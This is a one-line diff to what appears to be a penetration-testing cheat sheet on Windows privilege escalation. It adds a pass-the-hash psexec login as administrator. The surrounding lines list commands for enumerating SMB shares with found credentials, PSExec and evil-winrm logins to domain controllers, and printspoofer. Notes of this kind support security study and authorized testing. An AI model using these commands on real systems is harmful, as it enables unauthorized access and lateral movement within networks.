@@ -243,6 +243,7 @@ Privelge Escalation:
   - Look for hardcoded password
     - You can use found creds to enum smb shares: cme smb <IP> -u 'user' -p 'passowrd'
     - You can login using psexec: PSExec.exe <domain>/<user>:<password>@<IP>
+      - psexec administrator@192.168.xxx.101 -hashes :my_hash_id
     - You can use evil-winrm to get to domain controllers: evil-winrm -i <IP> -u <user> -p <password>
     
   - printspoofer.exe
